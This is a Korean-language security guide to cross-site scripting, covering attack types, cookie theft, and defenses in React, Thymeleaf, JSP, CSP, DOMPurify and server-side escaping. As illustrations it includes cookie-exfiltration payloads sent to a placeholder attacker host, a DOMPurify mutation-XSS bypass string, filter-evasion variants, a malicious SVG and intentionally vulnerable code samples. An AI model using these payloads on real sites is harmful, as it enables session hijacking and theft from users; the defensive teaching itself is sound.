---
title: XSS (Cross-Site Scripting)
tags: [security, xss, csp, sanitization, frontend-security]
updated: 2026-03-29
---

# XSS (Cross-Site Scripting)

웹 애플리케이션에 악성 JavaScript를 삽입해 다른 사용자의 브라우저에서 실행시키는 공격이다. SQL 인젝션이 서버를 노린다면, XSS는 사용자를 노린다.

XSS가 위험한 이유는 공격자가 피해자의 세션에서 코드를 실행할 수 있기 때문이다. 로그인된 상태에서 공격자의 스크립트가 실행되면, 그 스크립트는 피해자가 할 수 있는 모든 것을 할 수 있다.

---

## 공격 유형별 동작 원리

### Stored XSS (저장형)

악성 스크립트가 서버 DB에 저장되고, 다른 사용자가 해당 데이터를 조회할 때 브라우저에서 실행된다. 게시판, 댓글, 프로필 소개란이 대표적인 공격 지점이다.

```
[공격자] → 댓글 입력: <script>악성코드</script> → [서버 DB 저장]
                                                        ↓
[피해자] → 게시글 조회 → 서버가 댓글 데이터 응답 → 브라우저에서 스크립트 실행
```

Stored XSS는 공격자가 피해자에게 특정 URL을 클릭하게 만들 필요가 없다. 사용자가 정상적으로 페이지를 방문하는 것만으로 감염된다. 게시판 조회수가 높은 글에 스크립트를 심으면 대규모 피해가 발생한다.

실제 공격 시나리오 — 게시판 댓글을 통한 세션 탈취:

```html
<!-- 공격자가 댓글로 입력한 내용 -->
<img src="x" onerror="
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
">
```

`<script>` 태그는 대부분의 필터가 잡아낸다. 실제 공격은 이벤트 핸들러를 이용하는 경우가 많다. `<img>`, `<svg>`, `<details>` 같은 태그의 `onerror`, `onload`, `ontoggle` 속성을 사용한다.

### Reflected XSS (반사형)

서버가 요청 파라미터를 응답에 그대로 포함할 때 발생한다. 검색 결과 페이지가 대표적이다.

```
// 정상 요청
GET /search?q=spring+boot

// 공격 URL
GET /search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

서버 측 코드가 검색어를 이스케이프 없이 HTML에 삽입하면 스크립트가 실행된다:

```java
// 취약한 서블릿 코드
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q);  // 이스케이프 없이 전달
    return "search-result";
}
```

```html
<!-- 취약한 Thymeleaf 템플릿 -->
<p>검색어: <span th:utext="${query}"></span></p>
<!-- th:utext는 HTML을 그대로 출력한다. 여기에 스크립트가 들어오면 실행됨 -->
```

Reflected XSS는 공격자가 피해자에게 조작된 URL을 클릭하게 만들어야 한다. 피싱 메일이나 단축 URL 서비스를 통해 유포한다.

### DOM-based XSS

서버를 거치지 않고 브라우저의 JavaScript가 DOM을 조작하는 과정에서 발생한다. 서버 로그에 흔적이 남지 않아 탐지가 어렵다.

```javascript
// URL: https://example.com/page#<img src=x onerror=alert(1)>

// 취약한 코드 — location.hash를 innerHTML로 넣는다
const hash = decodeURIComponent(location.hash.substring(1));
document.getElementById('content').innerHTML = hash;
```

DOM-based XSS의 소스(입력)와 싱크(실행 지점)를 구분해서 파악해야 한다:

| 소스 (사용자 입력이 들어오는 곳) | 싱크 (코드가 실행되는 곳) |
|------|------|
| `location.hash` | `innerHTML` |
| `location.search` | `document.write()` |
| `document.referrer` | `eval()` |
| `window.name` | `setTimeout(문자열)` |
| `postMessage` 데이터 | `jQuery.html()` |

소스에서 가져온 값을 싱크에 넣기 전에 반드시 검증하거나 안전한 API를 써야 한다.

---

## 쿠키 탈취 시나리오와 방어

XSS로 가장 흔히 시도하는 공격이 쿠키 탈취다. 전체 흐름을 보면:

```
1. 공격자가 게시판에 악성 스크립트 삽입
2. 피해자가 게시글 열람
3. 스크립트가 document.cookie를 읽어 공격자 서버로 전송
4. 공격자가 탈취한 세션 쿠키로 피해자 계정에 접근
```

```javascript
// 공격 스크립트 예시
new Image().src = "https://attacker.com/log?c=" + document.cookie;

// 더 은밀한 방법 — navigator.sendBeacon은 페이지 이탈 시에도 전송된다
navigator.sendBeacon("https://attacker.com/log", document.cookie);
```

### HttpOnly 쿠키

`HttpOnly` 플래그가 설정된 쿠키는 JavaScript에서 접근할 수 없다. `document.cookie`로 읽히지 않는다.

```java
// Spring Boot — 세션 쿠키에 HttpOnly 설정
// application.yml
// server:
//   servlet:
//     session:
//       cookie:
//         http-only: true
//         secure: true
//         same-site: strict

// 직접 쿠키를 설정하는 경우
ResponseCookie cookie = ResponseCookie.from("sessionId", sessionId)
    .httpOnly(true)
    .secure(true)
    .sameSite("Strict")
    .path("/")
    .maxAge(Duration.ofHours(1))
    .build();
response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
```

HttpOnly만으로 XSS 방어가 끝나는 게 아니다. XSS가 성공하면 쿠키를 못 읽더라도 피해자의 세션에서 API를 직접 호출할 수 있다. 비밀번호 변경, 송금 요청 같은 작업을 스크립트로 수행한다. HttpOnly는 피해를 줄이는 장치지, XSS 자체를 막는 건 아니다.

---

## 프레임워크별 방어 메커니즘

### React

React는 JSX에서 변수를 렌더링할 때 자동으로 이스케이프한다.

```jsx
// 안전하다 — React가 자동 이스케이프
const userInput = '<script>alert("xss")</script>';
return <div>{userInput}</div>;
// 렌더링 결과: &lt;script&gt;alert("xss")&lt;/script&gt;
```

문제는 `dangerouslySetInnerHTML`이다. 이름에서부터 위험하다고 알려주고 있다.

```jsx
// 위험 — HTML을 그대로 렌더링한다
function Comment({ content }) {
    return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
```

`dangerouslySetInnerHTML`을 써야 하는 경우가 있다. 위지윅 에디터의 출력물이나 마크다운 렌더링 결과를 표시할 때다. 이 경우 반드시 서버 사이드에서 sanitize한 뒤 전달하거나, 클라이언트에서 DOMPurify를 거쳐야 한다.

```jsx
import DOMPurify from 'dompurify';

function Comment({ rawHtml }) {
    const clean = DOMPurify.sanitize(rawHtml);
    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

React에서 XSS가 발생하는 다른 경로:

```jsx
// href에 javascript: 프로토콜이 들어가면 클릭 시 스크립트 실행
// React 16.9부터 경고가 뜨지만, 차단하지는 않는다
const userUrl = "javascript:alert('xss')";
return <a href={userUrl}>클릭</a>;

// 방어: URL 스킴을 검증한다
function isSafeUrl(url) {
    try {
        const parsed = new URL(url);
        return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
    } catch {
        return false;
    }
}
```

### Thymeleaf (Spring 기반)

`th:text`와 `th:utext`의 차이가 핵심이다.

```html
<!-- th:text — HTML 이스케이프 처리. 안전하다 -->
<p th:text="${userInput}"></p>
<!-- 입력: <script>alert(1)</script> -->
<!-- 출력: &lt;script&gt;alert(1)&lt;/script&gt; -->

<!-- th:utext — HTML 그대로 출력. 위험하다 -->
<p th:utext="${userInput}"></p>
<!-- 입력: <script>alert(1)</script> -->
<!-- 출력: <script>alert(1)</script> → 스크립트 실행됨 -->
```

`th:utext`는 관리자가 작성한 공지사항처럼 신뢰할 수 있는 HTML만 출력할 때 사용한다. 사용자 입력에는 절대 쓰면 안 된다. 코드 리뷰에서 `th:utext`가 보이면 해당 데이터의 출처를 반드시 확인해야 한다.

속성에서도 주의할 점이 있다:

```html
<!-- th:attr로 속성값을 설정할 때도 이스케이프된다 -->
<a th:href="${userUrl}">링크</a>
<!-- 하지만 javascript: 프로토콜은 이스케이프로 막을 수 없다 -->

<!-- 서버에서 URL 스킴을 검증한다 -->
```

### JSP (레거시)

아직 JSP를 쓰는 프로젝트가 있다. 스크립틀릿에서 `<%= %>` 으로 출력하면 이스케이프가 없다.

```jsp
<!-- 취약 -->
<p>검색어: <%= request.getParameter("q") %></p>

<!-- JSTL로 교체 — 기본 이스케이프 적용 -->
<p>검색어: <c:out value="${param.q}" /></p>

<!-- EL 표현식에서도 fn:escapeXml 사용 -->
<p>검색어: ${fn:escapeXml(param.q)}</p>
```

---

## CSP (Content Security Policy) 설정

CSP는 브라우저에게 어떤 리소스를 로드하고 실행할 수 있는지 알려주는 HTTP 헤더다. XSS가 발생하더라도 공격자의 스크립트 실행을 차단할 수 있다.

### 기본 설정

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.example.com
```

각 디렉티브의 의미:

| 디렉티브 | 설명 |
|----------|------|
| `default-src 'self'` | 명시하지 않은 리소스는 같은 출처에서만 로드 |
| `script-src 'self'` | 스크립트는 같은 출처에서만 로드. 인라인 스크립트 차단 |
| `style-src 'self' 'unsafe-inline'` | 인라인 스타일 허용. 스타일은 XSS 위험이 상대적으로 낮다 |
| `connect-src` | fetch, XMLHttpRequest 등 네트워크 요청 대상 제한 |

### CSP와 XSS 방어의 연계

CSP가 XSS를 막는 핵심 원리:

1. **인라인 스크립트 차단** — `<script>alert(1)</script>` 같은 인라인 코드가 실행되지 않는다
2. **외부 스크립트 출처 제한** — 공격자 서버에서 스크립트를 로드할 수 없다
3. **eval() 차단** — `script-src`에 `'unsafe-eval'`이 없으면 eval 계열 함수가 차단된다

```java
// Spring Security에서 CSP 설정
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'")
        )
    );
    return http.build();
}
```

### nonce 기반 CSP

인라인 스크립트를 허용해야 하는 경우, 매 요청마다 랜덤 nonce를 생성해서 허용하는 방법이 있다. `'unsafe-inline'`보다 안전하다.

```
Content-Security-Policy: script-src 'nonce-abc123def456'
```

```html
<!-- nonce가 일치하는 스크립트만 실행된다 -->
<script nonce="abc123def456">
    // 이 스크립트는 실행됨
</script>

<script>
    // nonce가 없으므로 차단됨
    alert('blocked');
</script>
```

```java
// Spring에서 nonce 생성 및 적용
@Component
public class CspNonceFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) throws ServletException, IOException {
        String nonce = Base64.getEncoder().encodeToString(
            SecureRandom.getInstanceStrong().generateSeed(16)
        );
        request.setAttribute("cspNonce", nonce);
        response.setHeader("Content-Security-Policy",
            "script-src 'nonce-" + nonce + "' 'strict-dynamic'");
        chain.doFilter(request, response);
    }
}
```

### CSP 적용 시 주의사항

처음부터 엄격한 CSP를 적용하면 기존 기능이 깨지는 경우가 많다. 서드파티 스크립트(Google Analytics, 결제 모듈 등)가 차단된다.

도입 순서:

1. `Content-Security-Policy-Report-Only` 헤더로 리포트만 수집한다. 차단은 하지 않는다.
2. 리포트를 분석해 필요한 출처를 허용 목록에 추가한다.
3. 기존 기능에 문제가 없는지 확인한 뒤 `Content-Security-Policy`로 전환한다.

```
# 1단계: 리포트 모드
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

# 2단계: 서드파티 허용 추가
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' https://www.googletagmanager.com; report-uri /csp-report

# 3단계: 실제 적용
Content-Security-Policy: default-src 'self'; script-src 'self' https://www.googletagmanager.com
```

---

## DOMPurify 설정과 주의점

HTML을 사용자에게 보여줘야 하는 경우(위지윅 에디터, 마크다운 렌더링 결과)에 DOMPurify로 sanitize한다.

### 기본 사용

```javascript
import DOMPurify from 'dompurify';

// 기본 — 위험한 태그와 속성을 제거한다
const dirty = '<p>정상 텍스트</p><script>alert("xss")</script><img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
// 결과: <p>정상 텍스트</p><img src="x">
// script 태그가 제거되고, onerror 속성이 제거됨
```

### 설정 옵션

```javascript
// 허용할 태그를 명시적으로 지정 — 화이트리스트 방식
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br'],
    ALLOWED_ATTR: ['href', 'target']
});

// 특정 태그만 추가로 금지
const clean = DOMPurify.sanitize(dirty, {
    FORBID_TAGS: ['style', 'form', 'input'],
    FORBID_ATTR: ['style', 'onclick', 'onerror']
});
```

### 주의해야 할 설정

```javascript
// RETURN_DOM_FRAGMENT나 RETURN_DOM을 true로 설정하면
// DOMPurify가 문자열이 아닌 DOM 객체를 반환한다.
// innerHTML에 직접 할당하면 안 되고, appendChild로 추가해야 한다.
const fragment = DOMPurify.sanitize(dirty, { RETURN_DOM_FRAGMENT: true });
document.getElementById('content').appendChild(fragment);

// ADD_TAGS, ADD_ATTR는 기본 허용 목록에 추가하는 옵션이다.
// 무분별하게 추가하면 sanitize의 의미가 없어진다.
// 특히 'iframe'을 ADD_TAGS에 넣으면 외부 페이지를 삽입할 수 있게 되므로 주의한다.
const clean = DOMPurify.sanitize(dirty, {
    ADD_TAGS: ['iframe'],  // 위험할 수 있다
    ADD_ATTR: ['allowfullscreen']
});
```

### DOMPurify 우회 사례

DOMPurify는 지속적으로 업데이트되고 있지만, 과거 버전에서 우회 취약점이 발견된 적이 있다.

```javascript
// DOMPurify 2.0.12 이전 버전에서 mutation XSS 취약점이 있었다
// 브라우저의 HTML 파서와 DOMPurify의 파싱 결과가 다른 점을 악용
// <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

// 대응: DOMPurify를 항상 최신 버전으로 유지한다
// package.json에서 버전을 고정하지 말고 패치 버전은 자동 업데이트되게 한다
// "dompurify": "^3.0.0"
```

sanitize 로직을 직접 구현하면 안 된다. 정규식으로 `<script>`를 제거하는 방식은 항상 우회된다.

```javascript
// 잘못된 방어 — 정규식으로 태그 제거
function badSanitize(input) {
    return input.replace(/<script[^>]*>.*?<\/script>/gi, '');
}

// 우회: 대소문자 혼합
// <ScRiPt>alert(1)</ScRiPt>

// 우회: 중첩
// <scr<script>ipt>alert(1)</scr</script>ipt>

// 우회: 이벤트 핸들러 사용
// <img src=x onerror=alert(1)>

// 정규식으로는 HTML의 모든 엣지 케이스를 처리할 수 없다. DOMPurify를 사용한다.
```

---

## 서버 사이드 방어

클라이언트 방어만으로는 부족하다. 서버에서도 입력값을 검증하고 출력 시 이스케이프해야 한다.

### 입력 검증

```java
// Spring에서 입력값 검증
@PostMapping("/api/comments")
public ResponseEntity<?> createComment(@Valid @RequestBody CommentRequest request) {
    // Bean Validation으로 길이, 형식 제한
    commentService.create(request);
    return ResponseEntity.ok().build();
}

public class CommentRequest {
    @NotBlank
    @Size(max = 5000)
    @Pattern(regexp = "^[^<>]*$", message = "HTML 태그를 포함할 수 없습니다")
    private String content;
}
```

HTML을 허용해야 하는 경우(위지윅 에디터) 서버에서 sanitize한다:

```java
// Java에서 OWASP Java HTML Sanitizer 사용
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

PolicyFactory policy = Sanitizers.FORMATTING
    .and(Sanitizers.LINKS)
    .and(Sanitizers.BLOCKS);

String safeHtml = policy.sanitize(userInput);
// <script>, <iframe>, 이벤트 핸들러 등이 제거됨
```

### 출력 이스케이프

입력을 아무리 잘 검증해도, 출력 시 이스케이프를 빼먹으면 XSS가 발생한다. 입력 검증과 출력 이스케이프는 별개의 방어 계층이다.

출력 컨텍스트에 따라 이스케이프 방식이 다르다:

| 컨텍스트 | 이스케이프 대상 | 예시 |
|----------|----------------|------|
| HTML 본문 | `<`, `>`, `&`, `"`, `'` | `<p>사용자 이름</p>` |
| HTML 속성 | 위 + 공백, `/` | `<input value="사용자입력">` |
| JavaScript 문자열 | `\`, `'`, `"`, 줄바꿈 | `var name = '사용자입력';` |
| URL 파라미터 | URL 인코딩 | `?q=사용자입력` |

컨텍스트를 잘못 적용하면 이스케이프가 무력화된다. HTML 이스케이프만 적용한 값을 JavaScript 문자열에 넣으면 XSS가 발생할 수 있다.

---

## 실무에서 자주 놓치는 부분

### JSON 응답에서의 XSS

API가 JSON을 반환하더라도 Content-Type이 잘못 설정되면 브라우저가 HTML로 해석한다.

```java
// Content-Type이 없거나 text/html이면 위험하다
// 반드시 application/json으로 설정한다
@GetMapping(value = "/api/data", produces = MediaType.APPLICATION_JSON_VALUE)
public ResponseEntity<Map<String, String>> getData() {
    // Spring의 @RestController는 기본적으로 application/json을 사용한다
    // 직접 ResponseEntity를 만들 때 Content-Type을 명시하는 습관을 갖는다
    return ResponseEntity.ok()
        .contentType(MediaType.APPLICATION_JSON)
        .body(data);
}
```

### 파일 업로드를 통한 XSS

SVG 파일은 내부에 JavaScript를 포함할 수 있다. 사용자가 업로드한 SVG를 그대로 서빙하면 XSS가 발생한다.

```xml
<!-- 악성 SVG 파일 -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

대응 방법:

- 업로드된 이미지를 서빙할 때 `Content-Disposition: attachment` 헤더를 추가한다
- SVG 업로드를 허용해야 하면 SVG 내의 스크립트 태그와 이벤트 핸들러를 제거한다
- 업로드 파일을 별도 도메인(CDN)에서 서빙한다. 쿠키가 공유되지 않으므로 세션 탈취가 불가능하다

### postMessage를 통한 XSS

iframe 간 통신에 `postMessage`를 사용할 때 origin 검증을 빠뜨리면 외부에서 악성 메시지를 보낼 수 있다.

```javascript
// 취약한 코드 — origin 검증 없음
window.addEventListener('message', (event) => {
    document.getElementById('output').innerHTML = event.data;
});

// 안전한 코드 — origin 검증
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://trusted.example.com') {
        return;
    }
    document.getElementById('output').textContent = event.data;
});
```

---

## XSS 방어 요약

서버와 클라이언트 양쪽에서 방어해야 한다. 한쪽만 하면 반드시 뚫리는 경로가 생긴다.

| 계층 | 방어 수단 |
|------|----------|
| 서버 입력 | 입력값 검증, 길이 제한, HTML sanitize (OWASP Java HTML Sanitizer) |
| 서버 출력 | 템플릿 엔진의 자동 이스케이프 사용 (`th:text`, JSTL `c:out`) |
| 프레임워크 | React 자동 이스케이프 활용, `dangerouslySetInnerHTML` 사용 시 DOMPurify 적용 |
| HTTP 헤더 | CSP 설정, `X-Content-Type-Options: nosniff`, 쿠키에 HttpOnly/Secure/SameSite |
| 모니터링 | CSP report-uri로 위반 시도 수집, WAF 로그 분석 |
